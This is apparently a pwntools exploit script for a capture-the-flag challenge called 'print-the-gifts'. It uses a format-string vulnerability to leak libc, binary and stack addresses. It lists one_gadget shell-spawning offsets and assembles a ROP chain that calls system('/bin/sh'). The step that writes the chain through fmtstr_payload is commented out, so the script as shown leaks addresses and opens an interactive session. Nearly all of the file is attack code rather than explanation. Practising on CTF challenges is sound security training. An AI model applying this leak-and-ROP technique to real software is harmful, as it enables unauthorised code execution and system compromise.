#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "print-the-gifts.chals.nitectf2024.live", 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'debug'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b main
break *main+260
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO                                                                                                                                
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        PIE enabled
#    RUNPATH:    b'.'
#    Stripped:   No


#0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x60 is writable
#  rsp & 0xf == 0
#  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
#constraints:
#  address rsp+0x60 is writable
#  rsp & 0xf == 0
#  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
#  rbx == NULL || (u16)[rbx] == NULL

#0xd511f execve("/bin/sh", rbp-0x40, r13)
#constraints:
#  address rbp-0x38 is writable
#  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#  [r13] == NULL || r13 == NULL || r13 is a valid envp


def exploit():
    global io
    io = initialize()
    one_gadget = [0x4c139, 0x4c140, 0xd511f]
#    for i in range(100):
#       io.sendlineafter(b">", "AAAABBBB%%%d$p" % i)
#       io.recvuntil("Santa brought you a ")
#       leak = io.recvline().strip()
#       print("%d - %s\n" % (i, leak))
#       io.sendlineafter(b"Enter y or n:\n", "y")
# fmstr 8
    io.sendlineafter(b">", "%23$p.%p.%25$p")
    io.recvuntil("Santa brought you a ")
    leak = io.recvline().strip().decode().split(".")
    main = int(leak[2], 16)
    elf.address = main - elf.sym["main"]
    libc.address = int(leak[0],16) - 0x2724a
    stackleak = int(leak[1],16)
    ret = stackleak + 0x21a8
    pause()
    log.info("Main: %#x", main)
    log.info("Libc leak: %#x", int(leak[0],16))
    log.info("Elf base: %#x", elf.address)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack leak: %#x", stackleak)
    log.info("Stack ret: %#x", ret)
    log.info("Target: %#x", libc.address + one_gadget[2])
    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    payload = rop.chain()
#    for i in range(len(payload)):
#        io.sendlineafter(b"y or n:\n", b"y")
#        io.sendlineafter(b">", fmtstr_payload(8, {ret + i: p8(payload[i])}))

    io.interactive()
    
if __name__ == '__main__':
    exploit()
